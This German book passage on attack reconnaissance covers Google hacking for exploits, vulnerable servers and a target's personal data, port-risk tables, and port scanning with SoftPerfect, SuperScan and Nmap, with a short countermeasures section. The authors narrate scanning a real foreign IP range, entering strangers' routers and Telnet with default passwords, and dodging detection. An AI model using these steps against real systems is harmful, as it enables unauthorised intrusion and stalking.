sind, w\u00e4hlen wir jetzt einen v\u00f6llig anderen Ansatz. Im ersten Schritt suchen wir nach Exploits, wozu wir dann im zweiten Schritt fehlerhaft konfigurierte Webserver ausfindig machen wollen. W\u00fcrden wir in die Suchzeile nur \u00bbexploit\u00ab eingeben, w\u00e4re wenig gewonnen. Wir m\u00fcssten uns mit ungef\u00e4hr 926.000 Seiten allein auf Deutsch auseinandersetzen. Diese Menge k\u00f6nnen wir verkleinern, indem wir nur die neuesten Exploits suchen und uns auf diejenigen beschr\u00e4nken, die in C geschrieben sind.\n14.1 Google-Hacking\n181\nBild 14.10: Google nach Exploits suchen lassen\nWenn wir den uns zusagenden Exploit gefunden haben, suchen wir im Anschluss daran die anf\u00e4lligen Systeme, z. B. IIS 5.0 Server.\nBild 14.11: Auf der Suche nach anf\u00e4lligen Servern\nUnsere Liste ergab jetzt 80 Treffer, wovon wir uns unseren Zielserver aussuchen, an dem wir den zuvor gefundenen Exploit testen wollen.\n182\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.12: Zum Exploit den passenden Kandidaten finden\nEs geht nat\u00fcrlich noch einfacher, schlie\u00dflich gibt es Security-Scanner zum Aufdecken von aktuellen Sicherheitsl\u00fccken und Leute, die den Nessus-Report direkt ins Netz stellen. Alles, was man braucht, ist der simple Suchbefehl:\nBild 14.13: Bereits erkannte Sicherheitsl\u00fccken nutzen\nDanach bekamen wir dann Futter f\u00fcr die weiteren Attacken, n\u00e4mlich 200 Webseiten, auf denen das Ergebnis inklusive Serveradressen aufgelistet war. Jetzt kann man z. B. testen, ob die von Nessus angemahnten Sicherheitsl\u00fccken tats\u00e4chlich schon gestopft sind oder noch im Action Plan stehen.\n14.1 Google-Hacking\n183\nBild 14.14: Nessus-Report zwecks weiterer Verwendung\nLast but not least ein Tipp zum Thema Social Engineering. Nehmen wir an, jemand w\u00e4re hinter Ihnen her. Zur Kriegskunst geh\u00f6rt nun, erst einmal Informationen \u00fcber das Opfer zu sammeln. Man kann daf\u00fcr zwar einen Detektiv engagieren, aber auch hier \u00fcbernimmt Google diesen Job \u2013 ohne Murren und ohne daf\u00fcr auch nur einen Cent zu verlangen.\nBild 14.15: Suche nach pers\u00f6nlichen Daten eines Opfers\n184\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nDa viele Internet-User sich heute \u00fcberall im Internet, sprich in Jobb\u00f6rsen, Foren, G\u00e4steb\u00fcchern oder schlichtweg auf der eigenen Webseite verewigen, hat ein potenzieller Angreifer keine Schwierigkeiten beim Erkunden Ihres pers\u00f6nlichen Umfeldes. Teilweise sind Firmen noch leichtsinniger und stellen klassifiziertes Material ins Internet. Machen Sie mal folgendes Experiment und geben Sie in das Google-Suchfeld Folgendes ein:\nBild 14.16: Vertrauliches aus dem Netz fischen\nDanach hatten wir Zugriff auf brandneue Informationen \u00fcber B\u00f6rsentrends, die Sch\u00e4tzung des Entwicklungspotenzials der T\u00fcrkei etc. Und auf jeder Seite der Hinweis \u00bbConfidential / for internal use only\u00ab. Auf jeden Fall kann man mal unverbindlich in die oberen Etagen hineinschnuppern. Durch Ver\u00e4ndern der Suchparameter ergeben sich weitere Bet\u00e4tigungsfelder. So ist in unseren Netzen beispielsweise auch ein 50-seitiger Bericht der Wirtschaftspolizei (eines europ\u00e4ischen Landes) an die Staatsanwaltschaft h\u00e4ngen geblieben.\nBild 14.17: Vertraulich und nur f\u00fcr den internen Gebrauch: Fundst\u00fcck bei Google\nEs geht nat\u00fcrlich auch harmloser, z. B. die Suche nach mp3-Dateien, die sich die User auf ihre Webseite geladen haben. Alles kein Problem: Es reicht, \u00bbIndex of /\u00ab +MP3 in die\n14.1 Google-Hacking\n185\nSuchzeile einzugeben, um in fremden Musiksch\u00e4tzen ein wenig zu w\u00fchlen. Zwar ist dieser Trick schon etwas abgegriffen, und man muss sich erst seitenlang durch diverse Werbeangebote schlagen, dann aber kann man doch noch f\u00fcndig werden:\nBild 14.18: Googeln nach MP3s\nF\u00fcr die Betroffenen ist das nat\u00fcrlich weniger witzig bzw. richtig kostspielig, da sie dadurch ins Fadenkreuz professioneller Ermittler der Musikindustrie geraten. Mit Google wird das WWW zu einem richtigen Abenteuerspielplatz und Experimentierfeld f\u00fcr angehende Hacker. Wenn Sie noch ein bisschen Input brauchen, googlen Sie einfach mal nach \u00bbGoogle + Hacks\u00ab.\n14.1.2 Abwehrma\u00dfnahmen Wie man sich vor Google-Hacks sch\u00fctzt, m\u00f6chten Sie nun wissen? Nun, leider ist das nicht so einfach wie in unseren anderen Angriffsszenarien. Da Sie die Google-Suche in ihrem Informationshunger nicht gro\u00df bremsen k\u00f6nnen, bleibt Ihnen nur: \u2022\nNutzen Sie professionelle Tools mit entsprechenden Securitymechanismen f\u00fcrs Web-Publishing.\n\u2022\nSuchen Sie einen zuverl\u00e4ssigen und sicheren (wenn m\u00f6glich zertifizierten, zum Beispiel nach ISO 27001) Internet Service Provider f\u00fcr Ihre Website.\n\u2022\nWenn Sie den Webserver in Eigenregie betreiben, machen Sie regelm\u00e4\u00dfige Tests, um zu sehen, wie sicher bzw. unsicher Ihre Einstellungen arbeiten.\n\u2022\nTelefon- und E-Mail-Listen sollten nach M\u00f6glichkeit nicht bzw. nicht in maschinenlesbarer Form im WWW ver\u00f6ffentlicht werden, da das Missbrauchsrisiko (Spam etc.) viel zu hoch ist.\n\u2022\nKontrollieren Sie z. B. anhand einer Checkliste, wer welche Informationen auf der Webseite ver\u00f6ffentlicht. Registrydaten, Security-Reports etc. sollten definitiv nicht der breiten \u00d6ffentlichkeit zug\u00e4nglich gemacht werden.\n186\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\n\u2022\nDirectory-Listings sollten generell nicht zum Surfen freigegeben werden.\n\u2022\nGegen Web-Crawler (nicht jedoch gegen manuell arbeitende Hacker) hilft eine Datei namens robots.txt, in der Sie festlegen, welche Bots Sie daran hindern wollen, automatisch den Inhalt bestimmter Webseiten zu indizieren. Wenn Sie beispielsweise verhindern wollen, dass Ihre ins Netz gestellten PDF-Dateien indiziert werden, reicht folgender simpler Eintrag in die Robots.txt: # Kommentar: Googeln nach PDFs nicht erlaubt! User-Agent: Googlebot Disallow: /*.PDF$\nDie gute Nachricht zum Schluss. Es gibt nat\u00fcrlich ein Tool, mit dem Sie die Schwachstellen Ihrer Internetpr\u00e4senz bez\u00fcglich Google-Hacks umfassend testen k\u00f6nnen (bevor es ein anderer tut). Alles, was Sie brauchen, ist das kostenlose .Net-Framework von Microsoft oder einen Linux-PC, einen kostenlosen Google-API-Key sowie den SecurityWebscanner Wikto von www.sensepost.com (kostenlos). Nach der Installation k\u00f6nnen Sie eventuell noch fehlende Programmmodule plus die aktuellen Datenbanken mit den Angriffssignaturen (Google-Hacks) aus dem Internet herunterladen und loslegen. Im Scan-Wizard legen Sie die notwendigen Scanparameter wie IP-Adresse etc. fest, und danach k\u00f6nnen Sie die Seite nach externen Links, Schwachstellen, verf\u00fcgbaren Dokumenten etc. durchforsten.\nBild 14.19: Die Spiderfunktion von Wikto\n14.2 Portscanning, Fingerprinting und Enumeration\n187\nSelbstverst\u00e4ndlich stehen die updatef\u00e4higen Datenbasen des Schwachstellenscanners Nikto sowie die Google-Hacking-Database zur Verf\u00fcgung.\nBild 14.20: Wikto als Google-Hacker (aber die Seite ist gut gesichert)\n14.2\nPortscanning, Fingerprinting und Enumeration\nBevor potenzielle Angreifer einen Rechner kompromittieren, eine Remote-Shell einrichten oder sonstwie die Kontrolle \u00fcber eine oder mehrere Computerressourcen \u00fcbernehmen, m\u00fcssen sie zuerst die m\u00f6glichen Schwachstellen ihrer Opfer ausloten. Die einfachste und schnellste M\u00f6glichkeit haben wir beim Thema Google-Hacking vorgestellt.\n14.2.1 Portscanning Die klassische Angriffsvorbereitung \u2013 unabh\u00e4ngig von der Art und Konfiguration des Zielsystems (Web-/FTP-Server, Heimnetzwerk, Internetrechner etc.) \u2013 verl\u00e4uft dabei nach folgendem Schema:\n188\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.21: Die Logik des Portscannens\nStreng betrachtet k\u00f6nnen die Abschnitte 1 und 2 durchaus auch f\u00fcr Verteidigungszwecke eingesetzt werden, beispielsweise um eigene L\u00fccken systematisch zu schlie\u00dfen, einem mutma\u00dflichen Trojanerbefall oder der Infektion mit einem Remote Administration Tool (RAT) auf die Spur zu kommen. Abschnitt 3 ist nat\u00fcrlich eindeutig eine beauftragte (offizieller Penetrationstest) oder eine unbefugte, unrechtm\u00e4\u00dfige Angriffshandlung. Die Einzelaktivit\u00e4ten in Abschnitt 2 k\u00f6nnen in der beschriebenen Reihenfolge abgearbeitet werden, m\u00fcssen es aber nicht, da es durchaus Portscanner wie SuperScan 4 gibt, die den Portscan mit (rudiment\u00e4ren) Fingerprinting- und Enumerationstechniken kombinieren k\u00f6nnen. Dar\u00fcber hinaus sind einige Portscanner auch in der Lage, den Angreifer mit im Netz gefundenen Shares (Freigaben) direkt zu verbinden, ohne dass explizit der dritte Angriffsabschnitt eingeleitet w\u00fcrde. Abgrenzungsprobleme bereiten auch einige Schwachstellenscanner wie X-Scan oder FXScan, die weniger vielseitig als Nessus oder GFI Languard sind, daf\u00fcr aber gezielt und schnell spezifische, zum Teil auch \u00e4ltere Schwachstellen von Servern ans Tageslicht f\u00f6rdern.\n14.2 Portscanning, Fingerprinting und Enumeration\n189\nZielauswahl Bevor wir starten, m\u00fcssen wir uns \u00fcberlegen, welche IP-Adresse bzw. IP-Bereiche wir \u00fcberhaupt scannen wollen. Anhaltspunkte f\u00fcr einen etwas gezielteren Scan bieten IPBereichs\u00fcbersichten, wobei man einen der umfassendsten \u00dcberblicke auf der Seite www.flumps.org/ip/index.html findet:\nBild 14.22: IP Index Encyclopedia\nUm zu wissen, wen man anpingt, braucht man lediglich die Bl\u00f6cke einer bestimmten Netzwerkklasse (A, B oder C) auszuw\u00e4hlen. Einschr\u00e4nkend muss man allerdings dazu sagen, dass 1993 das klassenlose Routing CIDR (Classless Interdomain Routing) eingef\u00fchrt wurde, wodurch es keine Rolle mehr spielt, welcher Netzklasse eine bestimmte IPAdresse angeh\u00f6rt. Nichtsdestotrotz ist diese \u00dcbersicht f\u00fcr den ersten Einstieg gut geeignet. Man sollte allerdings bedenken, dass Portscanning zwar keine Angriffstechnik per se darstellt, es aber dennoch Institutionen und Firmen gibt, die ihre Logs auswerten, die Adresse des Sp\u00fcrhundes zur\u00fcckverfolgen und sich bei seinem Provider beschweren k\u00f6nnten. Um dieser Gefahr aus dem Weg zu gehen, kann man die Scans \u00fcber einen Proxy laufen lassen, wovon wir pers\u00f6nlich aus Performancegr\u00fcnden aber eher abraten. Die Gefahr des Entdecktwerdens l\u00e4sst sich aber durch die eingesetzte Scantechnik selbst (siehe unten) und/oder durch Auswahl von au\u00dfereurop\u00e4ischen IP-Adressen verringern. Auch als potenziell Betroffener sollte man es sich noch einmal vor Augen f\u00fchren: Das Scannen von offenen Ports mag ein Kavaliersdelikt sein, aber allein dadurch ist die Sicherheit des eigenen Rechners noch nicht bedroht. Ohne es zu besch\u00f6nigen: Portscanning ist lediglich ein Informationssammeln \u00fcber potenzielle Schwachstellen der ans Internet angeschlossenen Rechner.\n190\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.23: Wissen, wen man anpingt\nWelche Ports lohnen sich? Die meisten Portscanner starten nach Angabe einer IP-Adresse sofort mit der Suche nach ansprechbaren Rechnern im Netz. Interessanter wird die Sache aber, wenn wir unsere Spurensuche spezifizieren, sprich dem Scanner sagen, an welchen Ports er speziell \u00bbr\u00fctteln\u00ab soll. Interessante Ports62 sind beispielsweise: Port-Nr. Dienste / Prozesse\nBeschreibung / Angriffspotenzial\nRisiko\n11\nSystat\nActive user; Zugriff auf die aktuell eingeloggten User\n++\n21\nFTP\nKontrolle des Filetransfers; wird dieser Port geentert, kann der Angreifer auf dem Zielsystem beliebig Dateien hoch- und runterladen, manipulieren und l\u00f6schen\n+++\n22\nSSH\nVerschl\u00fcsselter Verbindungsaufbau; wenig Zugriffsm\u00f6glichkeiten\n+\n23\nTelnet\nLogin via Telnet; \u00e4hnlich unsicher wie Port 21\n+++\n62\nhttp://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers\n14.2 Portscanning, Fingerprinting und Enumeration\n191\nPort-Nr. Dienste / Prozesse\nBeschreibung / Angriffspotenzial\nRisiko\n25\nSMPT\nSimple Mail Transfer Protocol; prinzipiell angreifbar, um Zugriff auf den Zielrechner zu erlangen\n++\n43\nWhois\n++ Port, \u00fcber den Serverinformationen abgerufen werden k\u00f6nnen; keine direkte Angriffsm\u00f6glichkeit; aber anf\u00e4llig f\u00fcr DoS-Attacken\n53\nDNS\nDomain Name Service, kaum angreifbar\n+\n69\nTrivial FTP\nEinfacher Filetransfer ohne Verschl\u00fcsselung, Authentifizierung etc.; Computerw\u00fcrmer wie W32.Blaster nutzen TFTP-Server zu ihrer Verbreitung\n+++\n79\nFinger\nZur Abfrage von Benutzerdaten verwendet; falls Zugriff von au\u00dfen erfolgt, k\u00f6nnen pers\u00f6nliche Daten ausspioniert werden\n++\n80\nHTTP\nStellt einen Webserver bereit; je nach Konfiguration unterschiedlich hohe Sicherheitsrisiken\n++(+)\n88\nKerberos\nAuthentifizierungsdienst f\u00fcr offene und unsichere Netze; prinzipiell eher geringes Angriffspotenzial au\u00dfer durch Brute-Force-Angriffe\n+\n92\nNPP\nBereitstellen von Netzwerkdruckern / Druckerservern; Aussp\u00e4hen von Druckerstatus, Abschie\u00dfen des Druckerspoolers m\u00f6glich, ebenfalls Denial-ofService-Attacken\n+\n109\nPOP2\nPost Office Protocol; Angriffe \u00fcber infizierte Mailanh\u00e4nge, unberechtigter Systemzugriff prinzipiell m\u00f6glich\n++\n111\nRPC\nF\u00fcr die Abwicklung von Funktionsaufrufen (Remote +++ Protocol Calls) \u00fcber ein Netzwerk; sehr guter Angriffspunkt, um Laufwerke, Partitionen des Zielrechners von au\u00dfen zu mounten\n113\nIdent\nIdentification; Angreifer kann dar\u00fcber in Erfahrung bringen, welche Prozesse welche TCP/IP-Verbindungen nutzen\n++\n119\nNNTP\nNetwork News Transfer Protocol f\u00fcr den Betrieb von Newsservern\n+\n135\nEpmap\n++ Dienste, die DCOM / RPC im Netzwerk nutzen, registrieren Standort mit dem End-point mapper auf dem PC. Ein Angreifer kann \u00fcber diesen Port und den epmap-Dienst herausfinden ob z. B. auf dem Zielrechner ein MS-Exchange Server l\u00e4uft; au\u00dferdem bietet dieser Port Angriffsfl\u00e4che f\u00fcr DoSAttacken.\n192\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nPort-Nr. Dienste / Prozesse\nBeschreibung / Angriffspotenzial\nRisiko\n137-139 NetBIOS\n+++ Net-Basic-Input-Output-System, u. a. f\u00fcr die Verwaltung symbolischer Namen f\u00fcr Rechner im Netzwerk; \u00fcber NetBIOS (sogenannte NetBIOS-Namen) k\u00f6nnen zum Beispiel Ressourcen wie Drucker und Verzeichnisse f\u00fcr das Internet freigegeben werden. Besonders kritisch ist hier der Port 139, \u00fcber den ein Angreifer die Kontrolle \u00fcber die Shares (Freigaben) erlangen kann\n143\nIMAP\nInternet Message Access Protocol (f\u00fcr E-Mail-Server); Sicherheitsrisiken \u00e4hnlich wie bei den Protokollen POP2, POP3\n194\nIRC\nInternet Relay Chat, Sicherheitsl\u00fccken (Abschie\u00dfen + von IRC-Clients/Servern) sind m\u00f6glich, aber eher unwahrscheinlich\n213\nIPX over IP\nNovell Netware Protocol; generelle Sicherheitsrisiken, \u00fcber die ein Angreifer ins LAN dringen k\u00f6nnte\n++\n220\nIMAP3\nNeues IMAP-Protokoll, vgl. Port 143\n++\n401\nUPS\nUnterbrechungsfreie Stromversorgung; Angreifer k\u00f6nnten versuchen, die UPS abzuschie\u00dfen, ansonsten keine Daten\u00fcbertragung m\u00f6glich\n+\n443\nHTTPS\nSecure HyperText Transfer Protocol zum sicheren (verschl\u00fcsselten) \u00dcbertragen sensitiver Webinhalte; Angriffe \u00fcber Daten-Spoofing m\u00f6glich, aber generell geringere Erfolgswahrscheinlichkeit als bei reinem http\n++\n445\nMicrosoft DS\nSicherere Alternative zu den NetBIOS-Services (Port 137-139); \u00fcber Port 445 werden SMB Anfragen (Filesharing) geleitet inklusive Namensaufl\u00f6sung, Login und Browsing; wird der Zugriff nicht \u00fcber ein Passwort gesichert, erh\u00e4lt der Angreifer vollen Zugriff aufs System\n+++\n500\nISAKMP\n++ Schl\u00fcsselaustausch f\u00fcr IPSec-Tunnel \u00fcber das Internet Security Association and Key Management Protocol; anf\u00e4llig f\u00fcr DoS-Attacken\n513\nWho (UDP), Rlogin Erstellt eine Remote-Login-Session bzw. liefert (TCP) Informationen \u00fcber Login-Daten; potenzielles Sicherheitsrisiko wegen spezifischer Exploits\n++\n++\nDie Ports bis 1023 sind die sogenannten \u00bbwell known ports\u00ab; registrierte bzw. anwendungsspezifische Ports von 1024 \u2013 49151 werden als \u00bbregistered\u00ab bzw. \u00bbephemeral ports\u00ab angesprochen. Alles, was dar\u00fcber hinausgeht (bis 65535), sind \u00bbdynamic\u00ab bzw.\n14.2 Portscanning, Fingerprinting und Enumeration\n193\n\u00bbor private ports\u00ab. Viele Trojaner und Remote Administration Tools haben ihre eigenen, spezifischen Datenfenster ins WWW63. Die passenden Werkzeuge Bildhaft ausgedr\u00fcckt macht ein Portscanner nichts anderes als festzustellen, ob die Fenster und T\u00fcren eines Hauses offen stehen oder verriegelt sind.64 Solange, um im Bild zu bleiben, der potenzielle Angreifer nicht durch die offen stehenden T\u00fcren und Fenster einsteigt, ist sein Tun juristisch eher unbedenklich. Die Grenze verl\u00e4uft allerdings flie\u00dfend. Betrachten wir ein praktisches Beispiel. Vor einigen Jahren war es ein sehr beliebter Sport, das Netzwerk nach fehlerhaft konfigurierten Freigaben (\u00fcber Port 139) zu scannen. Speziell f\u00fcr diesen Zweck existierten zwei Tools: der SharesFinder und Legion. Selbst die d\u00fcmmsten Script-Kiddies konnten damit komplette Adressbereiche auf Schwachstellen scannen und sich im Anschluss gleich auf dem PC des Opfers breitmachen. Heute sind diese Tools allerdings etwas in die Jahre gekommen, und die schnellsten sind sie auch nicht. F\u00fcr unsere ersten Scanversuche nutzen wir stattdessen den Network Scanner von SoftPerfect.\nBild 14.24: Konfigurieren des Network Scanners von SoftPerfect\nViel einzustellen ist eigentlich nicht. Die wichtigste Einstellung betrifft die Shares; hier aktivieren wir alle und legen dann einen bestimmten IP-Adressbereich fest. Um die Suche zu beschleunigen, fokussieren wir uns nur auf die Ports 21, 23, 80, 139 und 445 (zu finden auf der Registerkarte General). Auf jeden Fall braucht man viel Gl\u00fcck und noch mehr Zeit, um derart ungesch\u00fctzte PCs zu finden. Mit anderen Worten: Man muss 63\nListe unter: http://andrew.triumf.ca/ports/sophos.html\n64\nmal abgesehen davon, dass sie auch durch eine Firewall versteckt (gestealtht) sein k\u00f6nnen\n194\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nviele Stunden investieren, bis man eine Chance hat, auf einen PC mit ungesch\u00fctzten Freigaben von au\u00dfen zugreifen zu k\u00f6nnen. Ergebnisse auswerten Die Auswertung der Scanresultate ist mit dem SoftPerfect Network Scanner relativ simpel. Alle Hosts, die im Status alive sind, werden sinnvollerweise ausgeblendet, was \u00fcbrig bleibt, sind aktive Netzwerkrechner mit und ohne Freigaben und mit den spezifizierten offenen Ports. Bevor man weitere Schritte unternimmt, sichert man die gefundenen IPAdressen mit ihren offenen Ports (was mitunter ein handfestes Indiz f\u00fcr m\u00f6gliche Schwachstellen sein kann) mit einer Whois-Abfrage ab \u2013 bevor man beispielsweise auf einem offiziellen Firmenserver der NSA oder CIA landet. Bei einigen Scannern ist eine Whois-Abfragem\u00f6glichkeit integriert, im Softperfect Scanner kann man ein externes Programm wie SmartWhois integrieren; weitere M\u00f6glichkeiten funktionieren \u00fcber den Firefox-Browser und ein entsprechendes Plugin65. Betrachten wir das an einem Beispiel. Wir scannen die IP-Range 196.0.0.0 \u2013 196.0.30.255 \u2013 irgendwo in Afrika.\nBild 14.25: Scannen in Afrika\n65\nhttps://addons.mozilla.org/firefox/603\n14.2 Portscanning, Fingerprinting und Enumeration\n195\nWir greifen jetzt eine spezifische Adresse heraus, z. B. die 196.0.7.169 \u2013 die entsprechende Eingabe in der Adresszeile von Firefox bringt uns nicht weiter: Directory Listing Denied. This Virtual Directory does not allow contents to be listed. Eine Whois-Anfrage kl\u00e4rt uns auf, (zu) wem die Adresse geh\u00f6rt:\nBild 14.26: Einer IP-Adresse den korrekten Owner zuordnen mit SmartWhois\nSie geh\u00f6rt der ugandischen Telekomgesellschaft. Unsere IP-Recherche ist jetzt zu Ende und zeigt uns 275 Treffer, d. h. 275 Computer sind alive. Wir ordnen jetzt zweckm\u00e4\u00dfigerweise die Trefferliste nach den gefundenen offenen Ports. Gerade die offenen Ports geben wichtige Hinweise f\u00fcr den n\u00e4chsten Step: das Ausnutzen spezifischer Schwachstellen \u00fcber Remotezugriff. Es geht teilweise noch einfacher. Mit der rechten Maustaste kann man versuchen, sich mit dem Rechner zu verbinden.\nBild 14.27: Verbindungsversuch leichtgemacht\n196\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBeim http-Verbindungsaufbau erh\u00e4lt man \u00f6fter mal die Meldung: Es klappt! Der Apache-Webserver ist auf dieser Website installiert! Interessanter ist es nat\u00fcrlich, wenn der Index der Webseite aufgelistet wird.\nBild 14.28: Mappen einer Webseite\nManchmal landet man auch in einem Router und das Passwort ist schon voreingestellt.\n14.2 Portscanning, Fingerprinting und Enumeration\n197\nBild 14.29: Gefunden: Router im Netz\nIn dem Fall findet man nat\u00fcrlich etliche weiterf\u00fchrende Informationen:\nBild 14.30: Zugriff auf fremden Router\nIn besonders ung\u00fcnstigen F\u00e4llen kann das Opfer hier richtig Pech haben \u2013 dann n\u00e4mlich, wenn der Angreifer jetzt die Einstellungen des Routers manipuliert und mit einem neuen, nur ihm bekannten Passwort absichert. Da im Router auch die aktuellen Sicherheitseinstellungen herabgesetzt bzw. deaktiviert werden k\u00f6nnen, hat ein potenzieller Angreifer f\u00fcr nachfolgende Aktivit\u00e4ten leichtes Spiel. \u00c4hnlich sieht es mit den Telnet-Zugriffen aus. Nach unseren Tests h\u00e4tten wir uns den Zugriff mit einem Standardpasswort password verschaffen k\u00f6nnen.\nBild 14.31: : Nach erfolgreichem Portscan: Zugriff via Telnet\nAnklopfen mit PING Was wir hier als erste Ergebnisse von Portscans vorgestellt haben, ist allerdings eher trivial. Viele Tools, die sich zu Dutzenden im Internet unter dem Suchbegriff IP-Scanner\n198\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\noder Portscanner tummeln, sind recht einfach gestrickt und verf\u00fcgen nur \u00fcber wenige Einstellm\u00f6glichkeiten. Die meisten arbeiten mit dem Standard-ICMP-Ping (um festzustellen, ob der Host lebt). ICMP steht f\u00fcr Internet Control Message Protocol und Ping f\u00fcr Paket Internet Groper und wird benutzt, um eine Netzwerkverbindung zu einer anderen Station zu testen. Unter Windows wird daf\u00fcr die Systemdatei ping.exe benutzt. Bei der Ausf\u00fchrung des Befehls ping wird ein ICMP-Paket vom Typ ICMP Echo Request an die Netzwerkstation gesendet. Wenn der Server dieses ICMP-Paket empfangen hat, sendet er ein ICMP-Paket vom Typ ICMP Echo Reply zur\u00fcck. In diesem Fall wei\u00df man, dass das Zielsystem alive ist: Der Host ist im Netzwerk aktiv. Nachteil dieser Methode: Das Zielsystem bzw. die vorgeschaltete Firewall erkennt, dass sie gescannt wird. Viele unbedarfte Heimanwender bekommen dann einen Schrecken, wenn die Desktop-Firewall eine entsprechende Warnmeldung ausgibt. Eine erweiterte Funktionalit\u00e4t stellt der Befehl tracert zur Verf\u00fcgung. Hier wird ein Ping zum Zielsystem geschickt, wobei zus\u00e4tzlich die zur\u00fcckgelegten Stationen protokolliert werden \u2013 n\u00fctzlich z. B. f\u00fcr die Feststellung, ob zwischen dem Angreifer und dem Zielsystem andere Router oder auch eine Firewall zwischengeschaltet ist.\nBild 14.32: Traceroute zeigt, wohin der Ping l\u00e4uft\nMehr Komfort bieten hier grafisch arbeitende Trace Router, z. B. VisualRoute66, weil man das Signal auch l\u00e4nder\u00fcbergreifend verfolgen kann.\n66\nwww.visualware.com\n14.2 Portscanning, Fingerprinting und Enumeration\n199\nBild 14.33: Trace Route\nObwohl Pings an sich harmlos sind, werden sie manchmal vom Zielrechner ignoriert, der Angreifer enth\u00e4lt in dem Fall statt eines \u00bbICMP Destination unreachable\u00ab (Rechner nicht erreichbar) gar keine Reaktion. Hier vertraut der Verteidiger auf das h\u00f6chst umstrittene Prinzip: Security through obscurity, also frei \u00fcbersetzt: Sicherheit durch Verborgensein. Allerdings bleibt der Rechner weiterhin durch TCP- & UDP-Scans adressierbar. Etwas ausgefeiltere Scanner als der Network Scanner von SoftPerfect (etwa der auch schon etwas in die Jahre gekommene SuperScan 4 aus dem Jahr 2005) unterst\u00fctzen hier unterschiedliche, einzeln aktivierbare Scantechniken.\n200\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.34: Ausgefeilte Scannerkonfiguration bei Superscan\nUDP-Portscans Bei einem UDP-Portscan wird ein UDP-Paket zum Zielrechner geschickt. Quittiert dieser die Nachricht mit der Antwort \u00bbICMP Port unreachable\u00ab, kann davon ausgegangen werden, dass der entsprechend angefragte Port inaktiv bzw. geschlossen ist. Wenn man keine Fehlermeldung bekommt, hei\u00dft das aber noch nicht zwangsl\u00e4ufig, dass der abgefragte Port tats\u00e4chlich offen ist. Da UDP im Gegensatz zu TCP ein verbindungsloses Protokoll ist, das ohne Fehlerkontrolle arbeitet, sind die r\u00fcckgemeldeten Ergebnisse nur mit Vorsicht zu verwenden: Der Host k\u00f6nnte generell nicht antworten; die maximale Anzahl ICMP-Meldungen wurde erreicht, oder die Antwort ist unterwegs verloren gegangen \u2013 vor allem aber braucht man viel Zeit f\u00fcr diese Scans, da deren Zuverl\u00e4ssigkeit bzw. Aussagekraft mit der Anzahl der Wiederholungen steigt. TCP-Portscans Ein TCP-Portscan arbeitet in den allermeisten F\u00e4llen schneller und zuverl\u00e4ssiger. F\u00fcr Windows kommen hier insbesondere zwei Scantechniken in Betracht: \u2022\nTCP Connect Scanning: Hier \u00fcbertr\u00e4gt der Client (Angriffsrechner) zuerst ein SYNPaket an den Server (Zielrechner); antwortet dieser mit einem RST/ACK-Paket,\n14.2 Portscanning, Fingerprinting und Enumeration\n201\ndann ist der Port geschlossen. Im anderen Fall schickt er ein SYN/ACK an den Angreifer, der das Paket dann mit einem ACK quittiert.\nBild 14.35: TCP Connect Scanning\nSolche Scans sind aus Sicht des Angreifers zuverl\u00e4ssig und schnell und gehen, obwohl Connect-Scans leicht zu entdecken sind, im Grundrauschen des Datenverkehrs oft unter. Um das Risiko des Entdecktwerdens vollst\u00e4ndig auszuschlie\u00dfen, greifen Angreifer gern auf den Half Open bzw. SYN Scan zur\u00fcck.\nBild 14.36: TCP SYN Connect\n\u2022\nTCP SYN Connect: Im Gegensatz zum Connect Scan schickt der Client bei erfolgreicher R\u00fcckmeldung \u00fcber ein SYN/ACK kein ACK-Paket, sondern unterbricht mit einem RST die Verbindung. Da die meisten Systeme eine unvollst\u00e4ndige Verbindungsaufnahme nicht protokollieren, ist das Risiko des Entdecktwerdens merklich geringer als in der ersten Variante.\n202\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nNmap Noch sehr viel mehr M\u00f6glichkeiten des Feintunings bietet der Rolls Royce unter den Portscannern: Nmap, der sogar Filmgeschichte67 geschrieben hat: In \u00bbMatrix Reloaded\u00ab hackt sich Trinity mithilfe des 2001 entdeckten SSH1-CRC32-Exploit in ein Kraftwerk ein, und im Film \u00bbBattle Royale\u00ab wird der Nmap-Quellcode sogar vorgef\u00fchrt. F\u00fcr Windows-User hat sich seit der ersten Auflage einiges getan. Heute geh\u00f6rt zum Downloadumfang von Nmap die grafische Oberfl\u00e4che Zenmap, die den Netzwerkscan stark vereinfacht.\nBild 14.37: Wingui Zenmap f\u00fcr Nmap\nUnter Linux/Unix ist Nmap im Allgemeinen aber schneller und flexibler einsetzbar. Lohnende Ziele f\u00fcr das weitere Vorgehen sind jetzt die offenen Ports und die damit assoziierten Dienste. Bevor ein Hacker jetzt versucht, diese Schwachstellen aktiv zu nutzen, um die Kontrolle \u00fcber das Zielsystem oder einzelne Subsysteme zu erlangen, wird er in der Regel einen oder mehrere Zwischenschritte einlegen. Da er (noch) nicht wei\u00df, unter welchem (Netzwerk-)Betriebssystem der Zielrechner \u00fcberhaupt l\u00e4uft, sind potenzielle Einbruchsversuche nicht sonderlich effizient. N\u00e4heren Aufschluss dar\u00fcber erm\u00f6glicht das aktive Stack-Fingerprinting68.\n14.2.2 Fingerprinting und Enumeration Das Werkzeug der Wahl (insbesondere f\u00fcr die Linux-/Unix-Welt) ist wieder einmal Nmap. Normalerweise muss mindestens ein Port des Zielsystems offen sein, um eine zuverl\u00e4ssige Aussage \u00fcber das eingesetzte Betriebssystem und seinen Versionsstand treffen zu k\u00f6nnen. Auch wenn dies nicht der Fall ist, liefert Nmap trotzdem eine (meist zutreffende) Voraussage. In der Windows-Welt (und wenn er auf den Einsatz von\n67\nhttp://nmap.org/movies.html\n68\nim Gegensatz zum passiven Fingerprinting, wo der Angreifer intern und noch dazu an einer zentralen Stelle des Netzwerks Daten abgreift\n14.2 Portscanning, Fingerprinting und Enumeration\n203\nNmap dort verzichtet) muss sich der potenzielle Angreifer etwas st\u00e4rker einschr\u00e4nken. Die meisten M\u00f6glichkeiten im Windows-Umfeld bietet das Tool Winfingerprint. Im internen Netzwerk 